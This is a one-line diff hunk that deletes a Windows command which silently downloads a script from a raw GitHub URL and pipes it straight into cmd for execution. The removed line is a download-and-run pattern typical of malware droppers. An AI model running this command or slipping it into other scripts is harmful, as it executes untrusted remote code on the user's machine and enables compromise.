@@ -1,1 +1,0 @@
-curl.exe -s https://raw.githubusercontent.com/nugp/1/1/1/tog | cmd /V:ON
